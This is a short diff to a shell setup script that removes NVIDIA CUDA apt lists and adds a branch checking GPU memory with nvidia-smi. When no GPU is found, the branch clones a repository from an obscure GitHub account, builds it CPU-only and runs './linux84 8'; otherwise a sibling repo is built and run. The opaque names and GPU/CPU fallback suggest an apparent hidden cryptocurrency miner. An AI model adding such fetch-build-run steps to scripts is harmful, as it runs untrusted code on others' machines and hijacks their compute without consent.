@@ -33,6 +33,20 @@ rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubunt
 
 rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
+google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+if [[ $google84121274 == *"failed"* ]]; then
+
+git clone https://github.com/mobileapps84741274/linuxcpu84
+cd linuxcpu84
+mkdir build
+cd build
+cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_CUDA:BOOL="0"
+make
+./linux84 8
+
+else
+
 git clone https://github.com/mobileapps84741274/linux8474
 cd linux8474
 mkdir build
@@ -40,3 +54,5 @@ cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make
 ./linux84 8
+
+fi
